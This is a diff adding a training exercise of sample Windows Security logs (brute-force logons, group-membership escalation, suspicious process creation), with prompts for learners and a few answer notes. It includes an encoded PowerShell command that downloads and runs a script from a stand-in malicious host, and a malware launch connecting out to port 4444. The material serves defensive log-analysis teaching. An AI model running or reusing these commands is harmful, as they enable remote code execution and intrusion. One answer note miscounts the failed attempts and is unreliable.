@@ -1,0 +1,270 @@
+======================================
+Part 1: Windows Security Logs
+======================================
+--------------------------------------------------------------------------
+Scenario 1: Brute Force Attack
+--------------------------------------------------------------------------
+Log Name:      Security
+Source:        Microsoft-Windows-Security-Auditing
+Date:          2024-08-21 14:23:15
+Event ID:      4625 // EventID for Login Failure
+Task Category: Logon
+Level:         Information
+Keywords:      Audit Failure
+User:          N/A
+Computer:      WORKSTATION-01 // host
+Description:   An account failed to log on.
+
+Subject:
+	Security ID:		S-1-0-0
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Logon Type:			3  // Logon Type 3
+
+Account For Which Logon Failed:
+	Security ID:		S-1-0-0
+	Account Name:		administrator
+	Account Domain:		CORP
+
+Failure Information:
+	Failure Reason:		Unknown user name or bad password.
+	Status:			0xC000006D
+	Sub Status:		0xC000006A
+
+Process Information:
+	Caller Process ID:	0x0
+	Caller Process Name:	-
+
+Network Information:
+	Workstation Name:	ATTACKER-PC
+	Source Network Address:	203.0.113.45
+	Source Port:		49152
+
+Additional Information:
+	Logon Process:		NtLmSsp 
+	Authentication Package:	NTLM
+	Transited Services:	-
+	Package Name (NTLM only):	-
+	Key Length:		0
+	
+Findings: An attacker trying to login on the system from 203.0.113.45 with network logon 3
+--------------------------------------------------------------------------
+Log Name:      Security
+Source:        Microsoft-Windows-Security-Auditing
+Date:          2024-08-21 14:23:16
+Event ID:      4625 // Login Failure
+Task Category: Logon
+Level:         Information
+Keywords:      Audit Failure
+User:          N/A
+Computer:      WORKSTATION-01 / target wks
+
+Subject:
+	Security ID:		S-1-0-0
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Logon Type:			3
+
+Account For Which Logon Failed:
+	Security ID:		S-1-0-0
+	Account Name:		administrator
+	Account Domain:		CORP
+
+Failure Information:
+	Failure Reason:		Unknown user name or bad password.
+	Status:			0xC000006D
+	Sub Status:		0xC000006A
+
+Network Information:
+	Workstation Name:	ATTACKER-PC
+	Source Network Address:	203.0.113.45
+	Source Port:		49153
+	
+Your task: Write teh findings in the comment box.
+--------------------------------------------------------------------------
+Log Name:      Security
+Source:        Microsoft-Windows-Security-Auditing
+Date:          2024-08-21 14:23:17
+Event ID:      4625 // ? 
+Task Category: Logon
+Level:         Information
+Keywords:      Audit Failure
+User:          N/A
+Computer:      WORKSTATION-01
+
+Account For Which Logon Failed:
+	Account Name:		administrator
+	Account Domain:		CORP
+
+Failure Information:
+	Status:			0xC000006D
+	Sub Status:		0xC000006A
+
+Network Information:
+	Source Network Address:	203.0.113.45
+	Source Port:		49154
+	
+Your task: Write the findings in the comment box.
+--------------------------------------------------------------------------
+Log Name:      Security
+Source:        Microsoft-Windows-Security-Auditing
+Date:          2024-08-21 14:25:43
+Event ID:      4624 // Logon Success
+Task Category: Logon
+Level:         Information
+Keywords:      Audit Success
+User:          N/A
+Computer:      WORKSTATION-01
+Description:   An account was successfully logged on.
+
+Subject:
+	Security ID:		S-1-5-18
+	Account Name:		WORKSTATION-01$
+	Account Domain:		CORP
+	Logon ID:		0x3e7
+
+Logon Information:
+	Logon Type:		3
+	Restricted Admin Mode:	-
+	Virtual Account:		No
+	Elevated Token:		Yes
+
+Impersonation Level:		Impersonation
+
+New Logon:
+	Security ID:		S-1-5-21-123456789-987654321-112233445-1001
+	Account Name:		administrator
+	Account Domain:		CORP
+	Logon ID:		0x12ABC34
+	Linked Logon ID:		0x0
+	Network Account Name:	-
+	Network Account Domain:	-
+	Logon GUID:		{12345678-ABCD-1234-ABCD-123456789ABC}
+
+Network Information:
+	Workstation Name:	ATTACKER-PC
+	Source Network Address:	203.0.113.45
+	Source Port:		49167
+	
+User attempted to brute force on the machine, failed 3 times and succeed on the 3rd attempt.
+--------------------------------------------------------------------------
+Scenario 2: Privilege Escalation ??
+--------------------------------------------------------------------------
+Log Name:      Security
+Source:        Microsoft-Windows-Security-Auditing
+Date:          2024-08-21 15:45:22
+Event ID:      4672
+Task Category: Special Logon
+Level:         Information
+Keywords:      Audit Success
+User:          CORP\jdoe // user detail
+Computer:      WORKSTATION-02
+Description:   Special privileges assigned to new logon.
+
+Subject:
+	Security ID:		S-1-5-21-123456789-987654321-112233445-1105
+	Account Name:		jdoe
+	Account Domain:		CORP
+	Logon ID:		0x45ABC78
+
+Privileges:	SeSecurityPrivilege
+			SeBackupPrivilege
+			SeRestorePrivilege
+			SeTakeOwnershipPrivilege
+			SeDebugPrivilege
+			SeSystemEnvironmentPrivilege
+			SeLoadDriverPrivilege
+			SeImpersonatePrivilege
+The above privileges were assigned to the user: jdoe
+--------------------------------------------------------------------------
+Log Name:      Security  
+Source:        Microsoft-Windows-Security-Auditing
+Date:          2024-08-21 15:45:25
+Event ID:      4732
+Task Category: Security Group Management
+Level:         Information
+Keywords:      Audit Success
+User:          CORP\jdoe
+Computer:      DC-01
+Description:   A member was added to a security-enabled local group. // What is Security enabled group?
+
+Subject:
+	Security ID:		S-1-5-21-123456789-987654321-112233445-1105
+	Account Name:		jdoe
+	Account Domain:		CORP
+	Logon ID:		0x45ABC78
+
+Member:
+	Security ID:		S-1-5-21-123456789-987654321-112233445-1105
+	Account Name:		CN=John Doe,CN=Users,DC=corp,DC=local
+
+Group:
+	Security ID:		S-1-5-32-544
+	Group Name:		Administrators
+	Group Domain:		Builtin
+
+Additional Information:
+	Privileges:		-
+	
+Write the findings in the comment box..what happened here?
+--------------------------------------------------------------------------
+Scenario 3: Suspicious Process Creation
+--------------------------------------------------------------------------
+Log Name:      Security
+Source:        Microsoft-Windows-Security-Auditing  
+Date:          2024-08-21 16:12:33
+Event ID:      4688  // Event ID for process creation
+Task Category: Process Creation
+Level:         Information
+Keywords:      Audit Success
+User:          CORP\victim
+Computer:      WORKSTATION-03
+Description:   A new process has been created.
+
+Creator Subject:
+	Security ID:		S-1-5-21-123456789-987654321-112233445-1108
+	Account Name:		victim
+	Account Domain:		CORP
+	Logon ID:		0x67DEF90
+
+Target Subject:
+	Security ID:		S-1-0-0
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x1234
+	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Token Elevation Type:	TokenElevationTypeDefault (1)
+	Mandatory Label:		S-1-16-8192
+	Creator Process ID:	0x5678
+	Creator Process Name:	C:\Windows\System32\cmd.exe
+	Process Command Line:	powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwBtAGEAbABpAGMAaQBvAHUAcwAuAGUAeABhAG0AcABsAGUALgBjAG8AbQAvAHMAaABlAGwAbAAuAHAAcwAxACIAKQA=
+	
+The attcker has bypassed the powershell policy and excuted the encoded command on the machine with using vitim
+--------------------------------------------------------------------------
+Log Name:      Security
+Source:        Microsoft-Windows-Security-Auditing
+Date:          2024-08-21 16:12:34
+Event ID:      4688
+Task Category: Process Creation
+Level:         Information
+Keywords:      Audit Success
+User:          CORP\victim
+Computer:      WORKSTATION-03
+
+Process Information:
+	New Process ID:		0x9ABC
+	New Process Name:	C:\Users\victim\AppData\Local\Temp\malware.exe
+	Token Elevation Type:	TokenElevationTypeDefault (1)
+	Creator Process ID:	0x1234
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	C:\Users\victim\AppData\Local\Temp\malware.exe -silent -connect 192.168.100.50:4444
+	
+Write the findings in the comment box..what happened here?
+--------------------------------------------------------------------------
